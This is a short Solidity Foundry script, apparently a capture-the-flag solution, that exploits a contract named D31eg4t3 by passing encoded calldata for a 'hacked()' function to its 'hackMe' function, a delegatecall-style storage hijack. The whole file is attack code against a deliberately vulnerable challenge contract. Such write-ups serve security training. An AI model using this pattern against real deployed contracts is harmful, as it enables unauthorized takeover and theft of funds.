pragma solidity ^0.8.0;

import "./d3l3gate.sol";
import "forge-std/Script.sol";

contract Exploit is Script{
    D31eg4t3 d31eg4t3 = new D31eg4t3();

    function exploit() public {
        // Create the calldata for the 'hacked' function
        bytes memory t = abi.encodeWithSignature("hacked()");

        // Call the 'hackMe' function of the D31eg4t3 contract with the 'hacked' calldata
        (bool success, bytes memory result) = d31eg4t3.hackMe(t);

        // Check if the call was successful
        require(success, "Exploit failed");
    }
}

